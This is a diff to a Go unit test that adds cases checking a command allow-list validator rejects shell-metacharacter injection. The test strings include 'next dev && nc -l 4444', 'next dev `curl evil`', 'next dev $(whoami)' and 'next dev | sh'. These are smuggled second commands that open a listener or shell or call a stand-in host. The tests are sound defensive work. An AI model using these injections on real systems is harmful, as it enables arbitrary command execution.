@@ -339,6 +339,50 @@ func TestValidateTier3Command_AllowList(t *testing.T) {
 			wantErr:     true,
 			errContains: "bare name (no path prefix)",
 		},
+
+		// --- Shell-metacharacter injection rejection (H-2) ---
+		{
+			name:        "newline injection next dev\\nbash",
+			command:     "next dev\nbash",
+			wantErr:     true,
+			errContains: "forbidden character",
+		},
+		{
+			name:        "pipe injection next dev && nc -l 4444",
+			command:     "next dev && nc -l 4444",
+			wantErr:     true,
+			errContains: "forbidden character",
+		},
+		{
+			name:        "backtick injection next dev `curl evil`",
+			command:     "next dev `curl evil`",
+			wantErr:     true,
+			errContains: "forbidden character",
+		},
+		{
+			name:        "dollar injection next dev $(whoami)",
+			command:     "next dev $(whoami)",
+			wantErr:     true,
+			errContains: "forbidden character",
+		},
+		{
+			name:        "pipe injection next dev | sh",
+			command:     "next dev | sh",
+			wantErr:     true,
+			errContains: "forbidden character",
+		},
+		{
+			name:        "redirect injection next dev > /tmp/x",
+			command:     "next dev > /tmp/x",
+			wantErr:     true,
+			errContains: "forbidden character",
+		},
+		{
+			name:        "semicolon injection next dev; bash",
+			command:     "next dev; bash",
+			wantErr:     true,
+			errContains: "forbidden character",
+		},
 	}
 
 	for _, tc := range cases {
